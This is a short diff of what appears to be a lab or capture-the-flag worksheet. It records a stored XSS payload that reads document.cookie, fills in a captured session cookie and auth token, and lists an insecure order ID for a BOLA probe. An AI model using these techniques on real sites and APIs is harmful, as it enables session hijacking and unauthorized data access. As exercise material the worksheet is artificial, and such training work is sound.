@@ -7,7 +7,8 @@
 
 ## PHASE 2: CLIENT-SIDE HIJACK (XSS)
 * **Stored XSS Payload:** [<script>alert(document.cookie)</script>]
-* **Secret Cookie Captured:** []
+* **Secret Cookie Captured:** [session_id=admin_secret_99812_do_not_share; auth_token=SUPPORT_TIER_1_SECRET_TOKEN
+]
 
 ## PHASE 3: API ENUMERATION (BOLA)
 * **Insecure Order ID:** [501]
